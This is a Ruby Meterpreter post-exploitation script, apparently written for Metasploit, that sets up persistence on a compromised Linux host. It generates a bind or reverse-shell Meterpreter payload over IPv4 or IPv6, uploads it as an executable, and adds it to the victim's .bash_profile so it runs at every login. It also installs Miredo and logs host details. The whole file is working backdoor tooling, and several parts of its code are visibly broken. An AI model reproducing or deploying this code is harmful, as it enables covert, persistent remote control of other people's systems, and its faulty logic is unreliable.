#Author: Ben Buchacher at bbuchacher[at]sbnsc.net
#Linux Persistence
#-------------------------------------------------------------------------------
@client = client
path = "/bin/"
lport = 443
helpcall = 0
verbose = 0
remove = 0
ipv6install = false
lport = "443"
lhost = Rex::Socket.source_address("1.2.3.4")
lhostipv6 = Rex::Socket.source_address("1:2:3:4:5:6:7:8")
ipv4payload = "linux/x86/meterpreter/bind_tcp"
ipv6payload = "linux/x86/meterpreter/reverse_tcp"

@exec_opts = Rex::Parser::Arguments.new(
	"-h"  => [ false,  "This help menu"],
	"-R"  => [ false,  "Reverse Shell {Default is Bind}"],
	"-4"  => [ false,  "IPv4 Persistence"],
	"-6"  => [ false,  "IPv6 Persistence"],
	"-p"  => [ true,   "Path to upload to"]
)
meter_type = client.platform

host,port = @client.tunnel_peer.split(':')
info = @client.sys.config.sysinfo
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
logs = ::File.join(Msf::Config.log_directory,'scripts', 'IPV6',Rex::FileUtils.clean_path(info['Computer'] + filenameinfo))
@logfol = logs
::FileUtils.mkdir_p(logs)
@dest = logs + "/" + Rex::FileUtils.clean_path(info['Computer'] + filenameinfo) + ".txt"
# Print Usage
def usage
	print_line "Meterpreter Script for creating a persistent IPv6 backdoor on a target host."
	print_line(@exec_opts.usage)
	raise Rex::Script::Completed
end
#Determine Package Manager
def enum_linux_distro
if client.fs.file.exists?("//usr//bin//apt-get")
	os_type = "Debian"
elsif client.fs.file.exists?("//usr//bin//yum")
	os_type = "CentOS"
elsif client.fs.file.exists?("//usr//bin//apt-get")
	os_type = "RedHat"
elsif client.fs.file.exists?("//usr//bin//apt-get")
	os_type = "Fedora"
elsif client.fs.file.exists?("//usr//bin//apt-get")
	os_type = "FreeBSD"
	end
	print_status "#{os_type} Distrobution detected"
	return os_type
end
#Install Miredo
def miredoinstall(os_type)
print_status("Installing Miredo...")
client.sys.process.execute("//usr//sbin//apt-get", "install miredo --force-yes -y")
sleep 10
end
def log_file(log_path = nil)
	host = @client.sys.config.sysinfo["Computer"]
	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
	if log_path
		logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
	else
		logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
	end
	::FileUtils.mkdir_p(logs)
	logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
	return logfile
end
#IPV6 Payload Generation (Bind / Reverse)
def ipv6_pay_gen(ipv6payload,lhostipv6,lport)
	if ipv6payload == "linux/x86/meterpreter/reverse_ipv6_tcp"
	print_status("Creating #{ipv6payload} LHOST=#{lhostipv6} LPORT=#{lport}")
	payload = "#{ipv6payload}"
	pay = client.framework.payloads.create(payload)
	pay.datastore['LPORT'] = lport
	pay.datastore['LHOST'] = lhostipv6
	return pay.generate
    else
	print_status("Creating #{ipv6payload} LPORT=#{lport}")
	payload = "#{ipv6payload}"
	pay = client.framework.payloads.create(payload)
	pay.datastore['LPORT'] = lport
	return pay.generate
	end	
end
#IPV4 Payload Generation (Bind / Reverse)
def ipv4_pay_gen(ipv4payload,lhost,lport)
	if ipv4payload == "linux/x86/meterpreter/reverse_tcp"
	print_status("Creating #{ipv4payload} LHOST=#{lhost} LPORT=#{lport}")
	payload = "#{ipv4payload}"
	pay = client.framework.payloads.create(payload)
	pay.datastore['LPORT'] = lport
	pay.datastore['LHOST'] = lhost
	return pay.generate
    else
	print_status("Creating #{ipv4payload} LPORT=#{lport}")
	payload = "#{ipv4payload}"
	pay = client.framework.payloads.create(payload)
	pay.datastore['LPORT'] = lport
	return pay.generate
	end
	
end
#Write Payload to Cliient
def write_to_victim(path,raw,logfile)
	exe = ::Msf::Util::EXE.to_linux_x86_elf(client.framework, raw)
	print_status("Payload executable #{exe.length} bytes long")
	location = session.fs.file.expand_path("#{path}")
	currentuser = ENV['USER']
	filename = "#{rand(10000)}"
	fileontrgt = "#{location}#{filename}"
	print_status("Uploading #{filename}....")
	fd = client.fs.file.new("#{location}#{filename}", "wb")
	fd.write(exe)
	fd.close
	print_status("Changing Permisions for payload...")
	client.sys.process.execute("//bin//chmod", "+x #{fileontrgt}")
	loginexec = "//#{currentuser}//.bash_profile"
	fd = @client.fs.file.new(loginexec, "ab")
	fd.write("\n#{location}#{filename} &")
	fd.close
	print_good("Persistent agent uploaded to '#{fileontrgt}'")
	file_local_write(@clean_up_rc, "rm #{loginexec}\n")
    ipinfo = open("|ifconfig")
	ip_info = ipinfo.read
	logfile << "#{ip_info}"
	file_local_write(@dest,logfile)
	return fileontrgt
end
@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		usage
	when "-4"
	ipv6install = false
	ipv4payload = "linux/x86/meterpreter/bind_tcp"
	when "-6"
	ipv6install = true
	ipv6payload = "linux/x86/meterpreter/bind_ipv6_tcp"
	when "-R"
	if ipv6install 
	ipv6payload = "linux/x86/meterpreter/reverse_ipv6_tcp"
	else
	ipv4payload = "linux/x86/meterpreter/reverse_tcp"
	end
	when "-p"
	path = val
	end
}
info = @client.sys.config.sysinfo
trgtos = info['OS']
print_status("Operating System is : #{trgtos}")
	wrong_meter_version(meter_type) if meter_type !~ /win32|win64|x86/i
	logfile =  "Date:       #{::Time.now.strftime("%Y-%m-%d.%H:%M:%S")}\n"
	logfile << "Running as: #{@client.sys.config.getuid}\n"
	logfile << "Host:       #{info['Computer']}\n"
	logfile << "OS:         #{info['OS']}\n"
	logfile << "\n\n\n"
	print_status("Saving general report to #{@dest}")
	print_status("Output of each individual command is saved to #{@logfol}")
	@clean_up_rc = log_file()
    print_status("Resource file for cleanup created at #{@clean_up_rc}")
	if ipv6install 
	enum_linux_distro
	miredoinstall()
	raw = ipv6_pay_gen(ipv6payload,lhostipv6,lport)
	else
	raw = ipv4_pay_gen(ipv4payload,lhost,lport)
	end
	write_to_victim(path,raw,logfile)
	print_good "Done!"